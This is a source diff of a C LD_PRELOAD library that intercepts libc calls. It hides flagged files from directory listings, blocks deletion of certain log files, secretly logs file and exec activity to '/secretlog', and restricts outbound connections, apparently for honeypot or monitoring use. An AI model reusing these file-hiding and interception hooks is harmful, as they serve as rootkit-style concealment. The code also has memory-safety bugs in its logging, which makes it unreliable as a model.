@@ -1,11 +1,11 @@
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <stdio.h>
 #include <string.h>
-#include <sys/types.h>
 #include <errno.h>
 #include <unistd.h>
 #include <stdlib.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
 #include <stdarg.h>
 
 #include "path.h"
@@ -18,16 +18,16 @@
 
 #define LOG_FILE "/secretlog"
 /* Buffer for log string */
-#define LOG_LENGTH 512
+#define LOG_LENGTH 4096
 static char logstring[LOG_LENGTH];
 
-/* Exec args and envs */
+/* Exec args and envs number*/
 #define ARG_LENGTH 32
 #define ENV_LENGTH 128
 static char* exec_args[ARG_LENGTH];
 static char* exec_envs[ENV_LENGTH];
 
-#define MAX_LEN 2048
+#define MAX_LEN 4096
 static char max_path[MAX_LEN];
 
 
@@ -45,15 +45,16 @@ static int (*orig_unlinkat)(int dirfd, const char *pathname, int flags);
 static int (*orig_rmdir)(const char *pathname);
 static int (*orig_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 static int (*orig_socket)(int domain, int type, int protocol);
+
+//FIXME: Temprorarily not needed
 static int (*orig_execl)(const char *path, const char *arg, ...);
 static int (*orig_execlp)(const char *file, const char *arg, ...);
 static int (*orig_execle)(const char *path, const char *arg,...);
+
 static int (*orig_execv)(const char *path, char *const argv[]);
 static int (*orig_execvp)(const char *file, char *const argv[]);
 static int (*orig_execve)(const char *filename, char *const argv[], char *const envp[]);
-static int (*orig_snprintf)(char *str, size_t size, const char *format, ...);
 	
-
 
 /* Structure to hold secret files and its flags */
 struct sec_file{
@@ -87,7 +88,6 @@ struct sec_file files[] = {
 	{"proftpd.log", SF_UNREMOVABLE},
 	{"thttpd.log", SF_UNREMOVABLE},
 	{"nodel", SF_UNREMOVABLE},
-//	{"superlog", SF_INVISIBLE},
 	{"mysql.log.", SF_INVISIBLE}
 };
 
@@ -96,13 +96,15 @@ struct replaced_file replaced_files[] = {
 	{"replacemedir", "inoutdir"}
 };
 
+//Socket info structure contains mapping sockets to ip-addresses
 #define SOCK_COUNT 16384
 int socket_info[SOCK_COUNT];
 
+//FIXME:addresses can be removed
 /* addresses to which computer can connect */
 const char* my_addresses[] = {
 	"192.168.152.2",
-	"192.168.152.135"
+	"192.168.152.135",
 	"87.250.250.3",
 	"87.250.251.3",
 	"93.158.134.3",
@@ -137,12 +139,11 @@ int myaddr(const char* addr){
 	return 0;
 }
 
-/* Check whether the given file satisfies the fileter */
+/* Check whether the given file satisfies the filter */
 int filter_file(const char* filename, int flag){
-	int count = (sizeof files) / (sizeof (struct sec_file)); 
-	int i;
+	int i, count = (sizeof files) / (sizeof (struct sec_file)); 
 	for(i = 0; i < count; i++){
-		if(strstr(filename, files[i].filename) != NULL
+		if(strstr(filename, files[i].filename)
 		   && ((files[i].flags & flag) != 0)){
 			return 1;
 		}
@@ -160,17 +161,18 @@ int is_unremovable(const char* filename){
 	return filter_file(filename, SF_UNREMOVABLE);
 }
 
-/* Is the given file replaced */
+/* Is the given file can be open only for append */
+int is_onlyappend(const char* filename){
+	return filter_file(filename, SF_ONLYAPPEND);
+}
+
+/* Is the given file replaced. Returns the replace name or NULL */
 char* is_replaced(const char* filename){
-	int count = (sizeof replaced_files) / (sizeof (struct replaced_file)); 
-	int i;
+	int i, count = (sizeof replaced_files) / (sizeof (struct replaced_file)); 
 	char *full_name = full_path(filename);
 	char *name = basename(full_name);
-	printf("filename: %s\n", filename);
 	strcpy(max_path, filename);
 	char *dname = dirname(max_path);
-	printf("filename: %s\nname: %s\n", filename, name);	
-	printf("full_name: %s\n", full_name);
 	for(i = 0; i < count; i++){
 		if(!strcmp(name, replaced_files[i].original)){
 			if(!strcmp(dname, ".")){
@@ -178,57 +180,34 @@ char* is_replaced(const char* filename){
 			}
 			else
 				sprintf(max_path, "%s/%s", dname, replaced_files[i].replace);
-			printf("pppp: %s\n", max_path);
 			return max_path;
 		}
 	}
 	return NULL;
 }
 
-
-/* Is the given file can be open only for append */
-int is_onlyappend(const char* filename){
-	return filter_file(filename, SF_ONLYAPPEND);
-}
-
 void logdentry(struct dirent* dentry){
-	const char* cur_dir = (const char*)get_current_dir_name();
-	snprintf(logstring, LOG_LENGTH, "readdir; name: %s/%s;\n", cur_dir, dentry->d_name);
+	char* full_name = full_path(dentry->d_name);
+	snprintf(logstring, LOG_LENGTH, "readdir; name: %s\n",full_name);
 	mylog(logstring);
 }
 
 void logdentry64(struct dirent64* dentry){
-	const char* cur_dir = (const char*)get_current_dir_name();
-	snprintf(logstring, LOG_LENGTH, "readdir64; name: %s/%s;\n", cur_dir, dentry->d_name);
+	char* full_name = full_path(dentry->d_name);
+	snprintf(logstring, LOG_LENGTH, "readdir64; name: %s\n", full_name);
 	mylog(logstring);
-}
-
-int absolute_path(const char* path){
-	return path != NULL && path[0] == '/';
 }
 
 void logopen(const char* filename){
-	char* cur_dir = (char*)get_current_dir_name();
-	char* slash = "/";
-	if(absolute_path(filename)){
-		strcpy(cur_dir, "");
-		slash = "";
-	}
-	snprintf(logstring, LOG_LENGTH, "opening file: %s%s%s\n", cur_dir, slash, filename);
+	char* full_name = full_path(filename);
+	snprintf(logstring, LOG_LENGTH, "opening file: %s\n", full_name);
 	mylog(logstring);
-	free(cur_dir);
 }
 
 void logunlink(const char* filename){
-	char* cur_dir = (char*)get_current_dir_name();
-	char* slash = "/";
-	if(absolute_path(filename)){
-		strcpy(cur_dir, "");
-		slash = "";
-	}
-	snprintf(logstring, LOG_LENGTH, "removing file: %s%s%s\n", cur_dir, slash, filename);
+	char *full_name = full_path(filename);
+	snprintf(logstring, LOG_LENGTH, "removing file: %s\n", full_name);
 	mylog(logstring);
-	free(cur_dir);
 }
 
 DIR* opendir(const char *name){
@@ -243,10 +222,9 @@ DIR* opendir(const char *name){
 }
 
 struct dirent *readdir(DIR *dirp){
-	struct dirent* dentry = NULL;
 	if(!orig_readdir)
 		orig_readdir = dlsym(RTLD_NEXT, "readdir");
-	dentry = (struct dirent*)orig_readdir(dirp);
+	struct dirent* dentry = (struct dirent*)orig_readdir(dirp);
 	while(dentry != NULL && is_invisible(dentry->d_name)){
 		dentry = (struct dirent*)orig_readdir(dirp);
 		logdentry(dentry);
@@ -258,10 +236,9 @@ struct dirent *readdir(DIR *dirp){
 }
 
 struct dirent64 *readdir64(DIR *dirp){
-	struct dirent64* dentry = NULL;
 	if(!orig_readdir64)
 		orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
-	dentry = (struct dirent64*)orig_readdir64(dirp);
+	struct dirent64* dentry = (struct dirent64*)orig_readdir64(dirp);
 	while(dentry != NULL && is_invisible(dentry->d_name)){
 		dentry = (struct dirent64*)orig_readdir64(dirp);
 		logdentry64(dentry);
@@ -341,14 +318,11 @@ int unlink(const char* pathname){
 	int ret = -1;
 	if(!orig_unlink)
 		orig_unlink = dlsym(RTLD_NEXT, "unlink");
-	puts("unlink2");
 	if(!is_unremovable(pathname)){
-		puts("unlink3");
 		ret = orig_unlink(pathname);
 	}
 	else
 		errno = EPERM;	
-	puts("unlink5");
 	logunlink(pathname);
 	return ret;
 }
@@ -379,63 +353,62 @@ int rmdir(const char *pathname){
 	return orig_rmdir(pathname);
 }
 
-int openat(int dirfd, const char *pathname, int flags, mode_t mode){
-	int ret = -1;
-	if(!orig_openat)
-		orig_openat = dlsym(RTLD_NEXT, "openat");
-	if(is_onlyappend(pathname) && (flags & O_TRUNC) != 0)
-		return ret;
+//int openat(int dirfd, const char *pathname, int flags, mode_t mode){
+//	int ret = -1;
+//	if(!orig_openat)
+//		orig_openat = dlsym(RTLD_NEXT, "openat");
+//	if(is_onlyappend(pathname) && (flags & O_TRUNC) != 0)
+//		return ret;
+//
+//	return orig_openat(dirfd, pathname, flags, mode);
+//}
+//
 
-	return orig_openat(dirfd, pathname, flags, mode);
-}
+//int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen){
+//	int ret = -1;
+//	struct sockaddr_in* sa = (struct sockaddr_in*) addr;
+//	const char* destaddr = (const char*)inet_ntoa(sa->sin_addr);
+//	if(sockfd < SOCK_COUNT && socket_info[sockfd] == 2 && !myaddr(destaddr)){
+//		printf("Not allowed to connect to %s\n", destaddr);
+//		return ret;
+//	}	
+//	snprintf(logstring, LOG_LENGTH, "connect to %s:%d\n", destaddr, htons(sa->sin_port));
+//	mylog(logstring);
+//	if(!orig_connect)
+//	mylog("first111");
+//      	orig_connect = dlsym(RTLD_NEXT, "connect");
+//	mylog("second222");
+//	ret = orig_connect(sockfd, addr, addrlen);
+//	mylog("third333");
+//	return ret;
+//}
+//
 
+//int socket(int domain, int type, int protocol){
+//	int ret = -1;
+//	orig_socket = dlsym(RTLD_NEXT, "socket");
+//	ret = orig_socket(domain, type, protocol);
+//	if(ret != -1){
+//		socket_info[(unsigned)ret] = domain;
+//	}
+//	return ret;
+//}
 
-int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen){
-	int ret = -1;
-	struct sockaddr_in* sa = (struct sockaddr_in*) addr;
-	const char* destaddr = (const char*)inet_ntoa(sa->sin_addr);
-	if(sockfd < SOCK_COUNT && socket_info[sockfd] == 2 && !myaddr(destaddr)){
-		printf("Not allowed to connect to %s\n", destaddr);
-		return ret;
-	}	
-	snprintf(logstring, LOG_LENGTH, "connect to %s:%d\n", destaddr, htons(sa->sin_port));
-	mylog(logstring);
-	if(!orig_connect)
-	mylog("first111");
-      	orig_connect = dlsym(RTLD_NEXT, "connect");
-	mylog("second222");
-	ret = orig_connect(sockfd, addr, addrlen);
-	mylog("third333");
-	return ret;
-}
-
-
-int socket(int domain, int type, int protocol){
-	int ret = -1;
-	orig_socket = dlsym(RTLD_NEXT, "socket");
-	ret = orig_socket(domain, type, protocol);
-	if(ret != -1){
-		socket_info[(unsigned)ret] = domain;
-	}
-	return ret;
-}
-
-FILE *freopen(const char *path, const char *mode, FILE *stream){
-	FILE *ret = NULL;
-	if(!orig_freopen)
-		orig_freopen = dlsym(RTLD_NEXT, "freopen");
-	ret = orig_freopen(path, mode, stream);
-	logopen(path);
-	return ret;
-}
+//FILE *freopen(const char *path, const char *mode, FILE *stream){
+//	FILE *ret = NULL;
+//	if(!orig_freopen)
+//		orig_freopen = dlsym(RTLD_NEXT, "freopen");
+//	ret = orig_freopen(path, mode, stream);
+//	logopen(path);
+//	return ret;
+//}
 
 void logexec(const char* filename, char *const args[]){
-	orig_snprintf = dlsym(RTLD_NEXT, "snprintf");
-	orig_snprintf(logstring, LOG_LENGTH, "execve %s", filename);
+	snprintf(logstring, LOG_LENGTH, "execve %s", filename);
 	char *argstring = logstring + strlen(logstring);
 	int i;
 	for(i = 0; args[i] != NULL; i++){
-		orig_snprintf(argstring, LOG_LENGTH, " %s", args[i]);
+		snprintf(argstring, LOG_LENGTH, " %s", args[i]);
 		argstring += strlen(args[i]) + 1;
 	}
 	mylog(logstring);
